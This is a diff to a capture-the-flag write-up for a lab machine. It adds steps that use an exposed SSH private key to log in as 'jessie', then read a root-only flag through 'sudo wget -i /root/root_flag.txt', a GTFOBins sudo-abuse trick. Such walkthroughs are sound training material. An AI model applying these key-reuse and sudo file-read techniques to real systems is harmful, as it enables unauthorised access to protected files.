@@ -33,6 +33,45 @@ we find a .ssh repo
 
 <img width="1378" height="321" alt="image" src="https://github.com/user-attachments/assets/34d19f98-cee9-43cc-8e29-4da7c93f6a97" />
 
+so we copy to the file id_rsa in our kali attacker machine and give the right privileges
+
+```
+chmod 600 id_rsa
+```
+
+and access the server
+
+```
+ssh -i id_rsa jessie@ip.thm
+```
+
 bingo ! we got the ssh to enter the server 
 
 <img width="739" height="398" alt="image" src="https://github.com/user-attachments/assets/e345616a-d00d-4698-ac18-95f2afe2fcd4" />
+
+the user flag is in /Documents :
+
+<img width="746" height="161" alt="image" src="https://github.com/user-attachments/assets/3a789449-4899-4df0-a160-020442710b43" />
+
+we do a 
+```
+sudo -l
+```
+<img width="746" height="144" alt="image" src="https://github.com/user-attachments/assets/de4b273e-8872-462c-aad3-ecc755a63e64" />
+
+go to GTFObins:
+
+<img width="911" height="466" alt="image" src="https://github.com/user-attachments/assets/a231af2f-85ac-4a68-b70b-3c03f05cf261" />
+
+i guess that the root flag may be 'root_flag.txt'
+
+so :
+
+```
+sudo wget -i /root/root_flag.txt -o flag.txt
+```
+
+<img width="911" height="170" alt="image" src="https://github.com/user-attachments/assets/f6300f33-67fb-41c9-9940-75891445e811" />
+
+Congrat room done !
+
